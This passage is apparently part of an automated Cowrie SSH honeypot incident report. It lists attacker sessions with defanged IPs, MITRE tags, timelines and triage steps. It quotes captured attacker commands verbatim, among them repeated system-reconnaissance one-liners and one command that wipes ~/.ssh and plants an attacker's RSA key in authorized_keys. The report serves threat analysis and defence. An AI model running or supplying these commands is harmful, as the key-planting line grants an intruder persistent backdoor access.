| `2026-07-28 15:38:31` | `cowrie.session.connect` |
| `2026-07-28 15:38:32` | `cowrie.client.version` |
| `2026-07-28 15:38:32` | `cowrie.client.kex` |
| `2026-07-28 15:38:33` | `cowrie.login.success` |
| `2026-07-28 15:38:34` | `cowrie.direct-tcpip.request` |
| `2026-07-28 15:38:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.222.6[.]204` to AbuseIPDB if not already reported
- [ ] Block `117.222.6[.]204` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa9705e29029

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-07-28 15:40 |
| **Last Seen** | 2026-07-28 15:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:40:48` | `cowrie.session.connect` |
| `2026-07-28 15:40:49` | `cowrie.client.version` |
| `2026-07-28 15:40:49` | `cowrie.client.kex` |
| `2026-07-28 15:40:53` | `cowrie.login.success` |
| `2026-07-28 15:40:55` | `cowrie.session.params` |
| `2026-07-28 15:40:55` | `cowrie.command.input` |
| `2026-07-28 15:40:55` | `cowrie.command.input` |
| `2026-07-28 15:40:55` | `cowrie.command.input` |
| `2026-07-28 15:40:55` | `cowrie.command.input` |
| `2026-07-28 15:40:55` | `cowrie.command.input` |
| `2026-07-28 15:40:55` | `cowrie.command.success` |
| `2026-07-28 15:40:55` | `cowrie.command.input` |
| `2026-07-28 15:40:55` | `cowrie.command.input` |
| `2026-07-28 15:40:55` | `cowrie.command.input` |
| `2026-07-28 15:40:55` | `cowrie.command.input` |
| `2026-07-28 15:40:56` | `cowrie.log.closed` |
| `2026-07-28 15:40:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b01036f2d4f6

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-07-28 15:43 |
| **Last Seen** | 2026-07-28 15:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:43:59` | `cowrie.session.connect` |
| `2026-07-28 15:44:00` | `cowrie.client.version` |
| `2026-07-28 15:44:00` | `cowrie.client.kex` |
| `2026-07-28 15:44:03` | `cowrie.login.success` |
| `2026-07-28 15:44:05` | `cowrie.session.params` |
| `2026-07-28 15:44:05` | `cowrie.command.input` |
| `2026-07-28 15:44:05` | `cowrie.command.input` |
| `2026-07-28 15:44:05` | `cowrie.command.input` |
| `2026-07-28 15:44:05` | `cowrie.command.input` |
| `2026-07-28 15:44:05` | `cowrie.command.input` |
| `2026-07-28 15:44:05` | `cowrie.command.success` |
| `2026-07-28 15:44:05` | `cowrie.command.input` |
| `2026-07-28 15:44:05` | `cowrie.command.input` |
| `2026-07-28 15:44:05` | `cowrie.command.input` |
| `2026-07-28 15:44:05` | `cowrie.command.input` |
| `2026-07-28 15:44:06` | `cowrie.log.closed` |
| `2026-07-28 15:44:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-812dc0e4b4b6

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 15:46 |
| **Last Seen** | 2026-07-28 15:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:46:49` | `cowrie.session.connect` |
| `2026-07-28 15:46:49` | `cowrie.client.version` |
| `2026-07-28 15:46:49` | `cowrie.client.kex` |
| `2026-07-28 15:46:49` | `cowrie.login.success` |
| `2026-07-28 15:46:49` | `cowrie.direct-tcpip.request` |
| `2026-07-28 15:46:49` | `cowrie.direct-tcpip.data` |
| `2026-07-28 15:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ae00a4f6690

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-07-28 15:46 |
| **Last Seen** | 2026-07-28 15:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:46:52` | `cowrie.session.connect` |
| `2026-07-28 15:46:52` | `cowrie.client.version` |
| `2026-07-28 15:46:52` | `cowrie.client.kex` |
| `2026-07-28 15:46:53` | `cowrie.login.success` |
| `2026-07-28 15:46:55` | `cowrie.session.params` |
| `2026-07-28 15:46:55` | `cowrie.command.input` |
| `2026-07-28 15:46:55` | `cowrie.command.input` |
| `2026-07-28 15:46:55` | `cowrie.command.input` |
| `2026-07-28 15:46:55` | `cowrie.command.input` |
| `2026-07-28 15:46:55` | `cowrie.command.input` |
| `2026-07-28 15:46:55` | `cowrie.command.success` |
| `2026-07-28 15:46:55` | `cowrie.command.input` |
| `2026-07-28 15:46:55` | `cowrie.command.input` |
| `2026-07-28 15:46:55` | `cowrie.command.input` |
| `2026-07-28 15:46:55` | `cowrie.command.input` |
| `2026-07-28 15:46:55` | `cowrie.log.closed` |
| `2026-07-28 15:46:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b11aad839a4

| Field | Detail |
|---|---|
| **Source IP** | `210.0.90[.]82` |
| **First Seen** | 2026-07-28 15:47 |
| **Last Seen** | 2026-07-28 15:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:47:59` | `cowrie.session.connect` |
| `2026-07-28 15:48:00` | `cowrie.client.version` |
| `2026-07-28 15:48:00` | `cowrie.client.kex` |
| `2026-07-28 15:48:02` | `cowrie.login.success` |
| `2026-07-28 15:48:03` | `cowrie.direct-tcpip.request` |
| `2026-07-28 15:48:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.0.90[.]82` to AbuseIPDB if not already reported
- [ ] Block `210.0.90[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3009208cdce4

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-07-28 15:50 |
| **Last Seen** | 2026-07-28 15:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:50:20` | `cowrie.session.connect` |
| `2026-07-28 15:50:20` | `cowrie.client.version` |
| `2026-07-28 15:50:20` | `cowrie.client.kex` |
| `2026-07-28 15:50:22` | `cowrie.login.success` |
| `2026-07-28 15:50:24` | `cowrie.session.params` |
| `2026-07-28 15:50:24` | `cowrie.command.input` |
| `2026-07-28 15:50:24` | `cowrie.command.input` |
| `2026-07-28 15:50:24` | `cowrie.command.input` |
| `2026-07-28 15:50:24` | `cowrie.command.input` |
| `2026-07-28 15:50:24` | `cowrie.command.input` |
| `2026-07-28 15:50:24` | `cowrie.command.success` |
| `2026-07-28 15:50:24` | `cowrie.command.input` |
| `2026-07-28 15:50:24` | `cowrie.command.input` |
| `2026-07-28 15:50:24` | `cowrie.command.input` |
| `2026-07-28 15:50:24` | `cowrie.command.input` |
| `2026-07-28 15:50:24` | `cowrie.log.closed` |
| `2026-07-28 15:50:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e990f49688ee

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-07-28 15:53 |
| **Last Seen** | 2026-07-28 15:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:53:53` | `cowrie.session.connect` |
| `2026-07-28 15:53:53` | `cowrie.client.version` |
| `2026-07-28 15:53:53` | `cowrie.client.kex` |
| `2026-07-28 15:53:54` | `cowrie.login.success` |
| `2026-07-28 15:53:55` | `cowrie.session.params` |
| `2026-07-28 15:53:55` | `cowrie.command.input` |
| `2026-07-28 15:53:55` | `cowrie.command.input` |
| `2026-07-28 15:53:55` | `cowrie.command.input` |
| `2026-07-28 15:53:55` | `cowrie.command.input` |
| `2026-07-28 15:53:55` | `cowrie.command.input` |
| `2026-07-28 15:53:55` | `cowrie.command.success` |
| `2026-07-28 15:53:55` | `cowrie.command.input` |
| `2026-07-28 15:53:55` | `cowrie.command.input` |
| `2026-07-28 15:53:55` | `cowrie.command.input` |
| `2026-07-28 15:53:55` | `cowrie.command.input` |
| `2026-07-28 15:53:55` | `cowrie.log.closed` |
| `2026-07-28 15:53:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4042fa83117d

| Field | Detail |
|---|---|
| **Source IP** | `180.76.185[.]216` |
| **First Seen** | 2026-07-28 15:55 |
| **Last Seen** | 2026-07-28 15:55 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:55:12` | `cowrie.session.connect` |
| `2026-07-28 15:55:12` | `cowrie.client.version` |
| `2026-07-28 15:55:12` | `cowrie.client.kex` |
| `2026-07-28 15:55:13` | `cowrie.login.success` |
| `2026-07-28 15:55:14` | `cowrie.session.params` |
| `2026-07-28 15:55:14` | `cowrie.command.input` |
| `2026-07-28 15:55:14` | `cowrie.command.failed` |
| `2026-07-28 15:55:15` | `cowrie.log.closed` |
| `2026-07-28 15:55:16` | `cowrie.session.params` |
| `2026-07-28 15:55:16` | `cowrie.command.input` |
| `2026-07-28 15:55:16` | `cowrie.session.file_download` |
| `2026-07-28 15:55:16` | `cowrie.log.closed` |
| `2026-07-28 15:55:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.185[.]216` to AbuseIPDB if not already reported
- [ ] Block `180.76.185[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ec399e0bf82

| Field | Detail |
|---|---|
| **Source IP** | `180.76.185[.]216` |
| **First Seen** | 2026-07-28 15:55 |
| **Last Seen** | 2026-07-28 15:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:55:16` | `cowrie.session.connect` |
| `2026-07-28 15:55:16` | `cowrie.client.version` |
| `2026-07-28 15:55:17` | `cowrie.client.kex` |
| `2026-07-28 15:55:21` | `cowrie.login.success` |
| `2026-07-28 15:55:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.185[.]216` to AbuseIPDB if not already reported
- [ ] Block `180.76.185[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b4823bd2e1b

| Field | Detail |
|---|---|
| **Source IP** | `180.76.185[.]216` |
| **First Seen** | 2026-07-28 15:55 |
| **Last Seen** | 2026-07-28 15:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:55:22` | `cowrie.session.connect` |
| `2026-07-28 15:55:22` | `cowrie.client.version` |
| `2026-07-28 15:55:22` | `cowrie.client.kex` |
| `2026-07-28 15:55:23` | `cowrie.login.success` |
| `2026-07-28 15:55:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.185[.]216` to AbuseIPDB if not already reported
- [ ] Block `180.76.185[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53db160b4281

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-07-28 15:56 |
| **Last Seen** | 2026-07-28 15:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:56:47` | `cowrie.session.connect` |
| `2026-07-28 15:56:47` | `cowrie.client.version` |
| `2026-07-28 15:56:47` | `cowrie.client.kex` |
| `2026-07-28 15:56:49` | `cowrie.login.success` |
| `2026-07-28 15:56:50` | `cowrie.session.params` |
| `2026-07-28 15:56:50` | `cowrie.command.input` |
| `2026-07-28 15:56:50` | `cowrie.command.input` |
| `2026-07-28 15:56:50` | `cowrie.command.input` |
| `2026-07-28 15:56:50` | `cowrie.command.input` |
| `2026-07-28 15:56:50` | `cowrie.command.input` |
| `2026-07-28 15:56:50` | `cowrie.command.success` |
| `2026-07-28 15:56:50` | `cowrie.command.input` |
| `2026-07-28 15:56:50` | `cowrie.command.input` |
| `2026-07-28 15:56:50` | `cowrie.command.input` |
| `2026-07-28 15:56:50` | `cowrie.command.input` |
| `2026-07-28 15:56:50` | `cowrie.log.closed` |
| `2026-07-28 15:56:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec9ffabce0e0

| Field | Detail |
|---|---|
| **Source IP** | `65.20.217[.]64` |
| **First Seen** | 2026-07-28 15:59 |
| **Last Seen** | 2026-07-28 15:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 15:59:28` | `cowrie.session.connect` |
| `2026-07-28 15:59:28` | `cowrie.client.version` |
| `2026-07-28 15:59:28` | `cowrie.client.kex` |
| `2026-07-28 15:59:29` | `cowrie.login.success` |
| `2026-07-28 15:59:30` | `cowrie.direct-tcpip.request` |
| `2026-07-28 15:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.217[.]64` to AbuseIPDB if not already reported
- [ ] Block `65.20.217[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-013c5103379b

| Field | Detail |
|---|---|
| **Source IP** | `136.56.34[.]147` |
| **First Seen** | 2026-07-28 16:01 |
| **Last Seen** | 2026-07-28 16:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 16:01:34` | `cowrie.session.connect` |
| `2026-07-28 16:01:35` | `cowrie.client.version` |
| `2026-07-28 16:01:35` | `cowrie.client.kex` |
| `2026-07-28 16:01:35` | `cowrie.login.success` |
| `2026-07-28 16:01:36` | `cowrie.direct-tcpip.request` |
| `2026-07-28 16:01:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.56.34[.]147` to AbuseIPDB if not already reported
- [ ] Block `136.56.34[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30267fdaef00

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-07-28 16:03 |
| **Last Seen** | 2026-07-28 16:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 16:03:52` | `cowrie.session.connect` |
| `2026-07-28 16:03:53` | `cowrie.client.version` |
| `2026-07-28 16:03:53` | `cowrie.client.kex` |
| `2026-07-28 16:03:56` | `cowrie.login.success` |
| `2026-07-28 16:03:58` | `cowrie.session.params` |
| `2026-07-28 16:03:58` | `cowrie.command.input` |
| `2026-07-28 16:03:58` | `cowrie.command.input` |
| `2026-07-28 16:03:58` | `cowrie.command.input` |
| `2026-07-28 16:03:58` | `cowrie.command.input` |
| `2026-07-28 16:03:58` | `cowrie.command.input` |
| `2026-07-28 16:03:58` | `cowrie.command.success` |
| `2026-07-28 16:03:58` | `cowrie.command.input` |
| `2026-07-28 16:03:58` | `cowrie.command.input` |
| `2026-07-28 16:03:58` | `cowrie.command.input` |
| `2026-07-28 16:03:58` | `cowrie.command.input` |
| `2026-07-28 16:03:59` | `cowrie.log.closed` |
| `2026-07-28 16:03:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dee8b2f9756

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-07-28 16:06 |
| **Last Seen** | 2026-07-28 16:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 16:06:29` | `cowrie.session.connect` |
| `2026-07-28 16:06:29` | `cowrie.client.version` |
| `2026-07-28 16:06:29` | `cowrie.client.kex` |
| `2026-07-28 16:06:31` | `cowrie.login.success` |
| `2026-07-28 16:06:33` | `cowrie.session.params` |
| `2026-07-28 16:06:33` | `cowrie.command.input` |
| `2026-07-28 16:06:33` | `cowrie.command.input` |
| `2026-07-28 16:06:33` | `cowrie.command.input` |
| `2026-07-28 16:06:33` | `cowrie.command.input` |
| `2026-07-28 16:06:33` | `cowrie.command.input` |
| `2026-07-28 16:06:33` | `cowrie.command.success` |
| `2026-07-28 16:06:33` | `cowrie.command.input` |
| `2026-07-28 16:06:33` | `cowrie.command.input` |
| `2026-07-28 16:06:33` | `cowrie.command.input` |
| `2026-07-28 16:06:33` | `cowrie.command.input` |
| `2026-07-28 16:06:34` | `cowrie.log.closed` |
| `2026-07-28 16:06:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-470556200c18

| Field | Detail |
|---|---|
| **Source IP** | `27.50.29[.]181` |
| **First Seen** | 2026-07-28 16:07 |
| **Last Seen** | 2026-07-28 16:08 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `env | head -10` |
